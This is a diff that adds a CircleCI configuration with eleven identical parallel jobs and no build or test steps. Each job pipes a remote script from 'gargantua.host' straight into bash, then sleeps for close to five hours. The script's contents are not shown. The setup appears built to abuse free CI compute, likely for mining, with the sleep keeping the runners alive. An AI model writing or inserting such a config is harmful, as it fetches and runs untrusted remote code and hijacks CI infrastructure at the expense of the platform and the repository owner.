@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  ceriacarl:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  ceriacarl10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylistanaheka.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - ceriacarl
+      - ceriacarl1
+      - ceriacarl2
+      - ceriacarl3
+      - ceriacarl4
+      - ceriacarl5
+      - ceriacarl6
+      - ceriacarl7
+      - ceriacarl8
+      - ceriacarl9
+      - ceriacarl10
